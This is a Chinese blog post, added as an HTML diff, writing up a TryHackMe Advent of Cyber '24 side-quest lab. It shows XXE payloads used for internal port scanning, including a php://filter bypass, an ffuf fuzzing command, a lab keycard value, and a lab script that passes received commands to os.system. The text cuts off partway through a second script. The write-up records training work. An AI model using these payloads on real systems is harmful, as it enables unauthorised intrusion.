@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+<meta name="google-site-verification" content="LZ0JOjQQZw7PhvjIbZqeOojf3J6807W7DPn6--OTptc" />
+<meta name="baidu-site-verification" content="code-DDmcbQ6zQN" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <meta name="google-site-verification" content="true">
+  <meta name="msvalidate.01" content="true">
+  <meta name="yandex-verification" content="true">
+  <meta name="baidu-site-verification" content="true">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"noone40404.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="阴阳碰面能不能合成阴阳龙啊">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM打靶日寄61-Advent of Cyber &#39;24：支线T2丑陋复现">
+<meta property="og:url" content="http://noone40404.github.io/2025/01/24/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8461%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT2/index.html">
+<meta property="og:site_name" content="noone___&#39;s blog">
+<meta property="og:description" content="阴阳碰面能不能合成阴阳龙啊">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6793037cd0e0a243d4f76750.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6793060ad0e0a243d4f76834.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67930669d0e0a243d4f76843.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679306c7d0e0a243d4f76856.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67930716d0e0a243d4f7685a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6793082ed0e0a243d4f768b1.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67930956d0e0a243d4f76928.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67930a55d0e0a243d4f76993.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67934e0cd0e0a243d4f787da.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679352eed0e0a243d4f78f58.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679353e8d0e0a243d4f79057.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67935458d0e0a243d4f79070.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679357d8d0e0a243d4f792a7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679356f5d0e0a243d4f7921f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67935712d0e0a243d4f7922c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67935733d0e0a243d4f79238.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679358fad0e0a243d4f793f6.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67935a2cd0e0a243d4f794cb.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67935ab2d0e0a243d4f79505.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67935b14d0e0a243d4f79530.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67935d34d0e0a243d4f796df.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67935e98d0e0a243d4f797be.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67935e64d0e0a243d4f797a7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67935dded0e0a243d4f7975b.png">
+<meta property="article:published_time" content="2025-01-24T00:26:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T09:34:23.968Z">
+<meta property="article:author" content="noone___">
+<meta property="article:tag" content="THM">
+<meta property="article:tag" content="Advent of Cyber 2024">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6793037cd0e0a243d4f76750.png">
+
+<link rel="canonical" href="http://noone40404.github.io/2025/01/24/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8461%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>THM打靶日寄61-Advent of Cyber '24：支线T2丑陋复现 | noone___'s blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="noone___'s blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">noone___'s blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/noone40404" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2025/01/24/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8461%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          THM打靶日寄61-Advent of Cyber '24：支线T2丑陋复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-24 08:26:00 / 修改时间：17:34:23" itemprop="dateCreated datePublished" datetime="2025-01-24T08:26:00+08:00">2025-01-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">阴阳碰面能不能合成阴阳龙啊</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li><p><code>keycard</code></p>
+<p>  继续通过时间判断出位于 <code>Day5</code> 的房间中，注意到最后一句的提示：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/6793037cd0e0a243d4f76750.png" alt=""></p>
+<p>  那就是利用rce来扫端口：</p>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:FUZZ/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wishlist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user_id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">user_id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">product_id</span>&gt;</span><span class="symbol">&amp;payload;</span><span class="tag">&lt;/<span class="name">product_id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wishlist</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>  把整个数据包存下来跑 <code>ffuf</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -request port_scan -request-proto http -w &lt;(seq 1 65537)  -fs 19</span><br></pre></td></tr></table></figure>
+<p>  拿到一个 <code>3306</code> ，但没有什么东西</p>
+<p>  偷看发现这里应该编码请求来绕过过滤：</p>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:FUZZ/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wishlist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user_id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">user_id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">product_id</span>&gt;</span><span class="symbol">&amp;payload;</span><span class="tag">&lt;/<span class="name">product_id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wishlist</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>  据此扫到 <code>8080</code> ：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/6793060ad0e0a243d4f76834.png" alt=""></p>
+<p>  访问后得到一串 <code>base64</code> 字符，解密发现其访问了 <code>access.log</code></p>
+<p>  <img src="https://pic1.imgdb.cn/item/67930669d0e0a243d4f76843.png" alt=""></p>
+<p>  <img src="https://pic1.imgdb.cn/item/679306c7d0e0a243d4f76856.png" alt=""></p>
+<p>  访问一下 [<a target="_blank" rel="noopener" href="http://10.10.200.7/k3yZZZZZZZZZ/t2_sm1L3_4nD_w4v3_boyS.png">http://10.10.200.7/k3yZZZZZZZZZ/t2_sm1L3_4nD_w4v3_boyS.png</a>] 得到钥匙卡</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67930716d0e0a243d4f7685a.png" alt=""></p>
+<p>  <code>smile_and_wave_boys</code></p>
+</li>
+<li><p>前置-ros</p>
+</li>
+<li><p>阴与阳-检查</p>
+<p>  先扫下两台机器，都只开放了 <code>21337</code> 端口</p>
+<p>  <img src="https://pic1.imgdb.cn/item/6793082ed0e0a243d4f768b1.png" alt=""></p>
+<p>  访问一下输入钥匙卡来解锁ssh登录</p>
+<p>  那么显然此时该考虑提权到root了：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67930956d0e0a243d4f76928.png" alt=""></p>
+<p>  <img src="https://pic1.imgdb.cn/item/67930a55d0e0a243d4f76993.png" alt=""></p>
+<p>  对于 <code>yang.sh</code> 和 <code>yin.sh</code> ，发现其正在运行 <code>rosrun</code> ，该命令允许运行任意包中的可执行文件</p>
+<p>  试着运行一下这两个脚本，发现其无法注册到 <code>http://localhost:11311</code> 上的主节点</p>
+<p>  这里应该会有如下的回显报错，但我自己执行的时候并没有显示出来</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67934e0cd0e0a243d4f787da.png" alt=""></p>
+<p>  那么两台机器上或许都需要先运行 <code>ros</code> 服务器才能执行命令</p>
+<p>  随后检查下实际运行的node脚本</p>
+<ul>
+<li><p><code>runyin.py</code></p>
+<p>  位于 <code>/catkin_ws/src/yin/scripts/runyin.py</code></p>
+  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rospy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> std_msgs.msg <span class="keyword">import</span> String</span><br><span class="line"><span class="keyword">from</span> yin.msg <span class="keyword">import</span> Comms</span><br><span class="line"><span class="keyword">from</span> yin.srv <span class="keyword">import</span> yangrequest</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Signature <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Cryptodome.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yin</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        self.messagebus = rospy.Publisher(<span class="string">&#x27;messagebus&#x27;</span>, Comms, queue_size=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Read the message channel private key</span></span><br><span class="line">        pwd = <span class="string">b&#x27;secret&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/catkin_ws/privatekey.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">            self.priv_key = RSA.import_key(data,pwd)</span><br><span class="line"></span><br><span class="line">        self.priv_key_str = self.priv_key.export_key().decode()</span><br><span class="line"></span><br><span class="line">        rospy.init_node(<span class="string">&#x27;yin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.prompt_rate = rospy.Rate(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Read the service secret</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/catkin_ws/secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">            self.secret = data.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.service = rospy.Service(<span class="string">&#x27;svc_yang&#x27;</span>, yangrequest, self.handle_yang_request)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_yang_request</span>(<span class="params">self, req</span>):</span></span><br><span class="line">        <span class="comment"># Check secret first</span></span><br><span class="line">        <span class="keyword">if</span> req.secret != self.secret:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Secret not valid&quot;</span></span><br><span class="line"></span><br><span class="line">        sender = req.sender</span><br><span class="line">        receiver = req.receiver</span><br><span class="line">        action = req.command</span><br><span class="line"></span><br><span class="line">        os.system(action)</span><br><span class="line"></span><br><span class="line">        response = <span class="string">&quot;Action performed&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getBase64</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        hmac = base64.urlsafe_b64encode(message.timestamp.encode()).decode()</span><br><span class="line">        hmac += <span class="string">&quot;.&quot;</span></span><br><span class="line">        hmac += base64.urlsafe_b64encode(message.sender.encode()).decode()</span><br><span class="line">        hmac += <span class="string">&quot;.&quot;</span></span><br><span class="line">        hmac += base64.urlsafe_b64encode(message.receiver.encode()).decode()</span><br><span class="line">        hmac += <span class="string">&quot;.&quot;</span></span><br><span class="line">        hmac += base64.urlsafe_b64encode(<span class="built_in">str</span>(message.action).encode()).decode()</span><br><span class="line">        hmac += <span class="string">&quot;.&quot;</span></span><br><span class="line">        hmac += base64.urlsafe_b64encode(<span class="built_in">str</span>(message.actionparams).encode()).decode()</span><br><span class="line">        hmac += <span class="string">&quot;.&quot;</span></span><br><span class="line">        hmac += base64.urlsafe_b64encode(message.feedback.encode()).decode()</span><br><span class="line">        <span class="keyword">return</span> hmac</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getSHA</span>(<span class="params">self, hmac</span>):</span></span><br><span class="line">        m = hashlib.sha256()</span><br><span class="line">        m.update(hmac.encode())</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(m.hexdigest())  </span><br><span class="line"></span><br><span class="line">    <span class="comment">#This function will craft the signature for the message based on the specific system being talked to</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign_message</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        hmac = self.getBase64(message)</span><br><span class="line">        hmac = SHA256.new(hmac.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        signature = PKCS1_v1_5.new(self.priv_key).sign(hmac)</span><br><span class="line">        sig = base64.b64encode(signature).decode()</span><br><span class="line">        message.hmac = sig</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">craft_ping</span>(<span class="params">self, receiver</span>):</span></span><br><span class="line">        message = Comms()</span><br><span class="line">        message.timestamp = <span class="built_in">str</span>(rospy.get_time())</span><br><span class="line">        message.sender = <span class="string">&quot;Yin&quot;</span></span><br><span class="line">        message.receiver = receiver</span><br><span class="line">        message.action = <span class="number">1</span></span><br><span class="line">        message.actionparams = [<span class="string">&#x27;touch /home/yang/yin.txt&#x27;</span>]</span><br><span class="line">        <span class="comment">#message.actionparams.append(self.priv_key_str)</span></span><br><span class="line">        message.feedback = <span class="string">&quot;ACTION&quot;</span></span><br><span class="line">        message.hmac = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_pings</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># Yang</span></span><br><span class="line">        message = self.craft_ping(<span class="string">&quot;Yang&quot;</span>)</span><br><span class="line">        message = self.sign_message(message)</span><br><span class="line">        self.messagebus.publish(message)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_yin</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> rospy.is_shutdown():</span><br><span class="line">            self.send_pings()</span><br><span class="line">            self.prompt_rate.sleep()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        yin = Yin()</span><br><span class="line">        yin.run_yin()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> rospy.ROSInterruptException:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>  其功能如下：</p>
+<ul>
+<li>通过 <code>messagebus</code> 主题向另一个节点发送消息，类型为 <code>Comms</code></li>
+<li>从 <code>/catkin_ws/privatekey.pem</code> 中加载私钥</li>
+<li>提供服务 <code>svc_yang</code> ，用于处理其他节点发送的服务请求，类型为 <code>yangrequest</code>； 此时会验证请求中的 <code>secret</code> 值</li>
+<li>用私钥来生成消息签名</li>
+<li>周期性生成针对 <code>yang</code> 的消息，该消息包含具体的行为：<code>touch /home/yang/yin.txt</code> 并通过 <code>messagebus</code> 发布</li>
+</ul>
+</li>
+<li><p><code>runyang.py</code></p>
+<p>  位于 <code>/catkin_ws/src/yang/scripts/runyang.py</code></p>
+  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 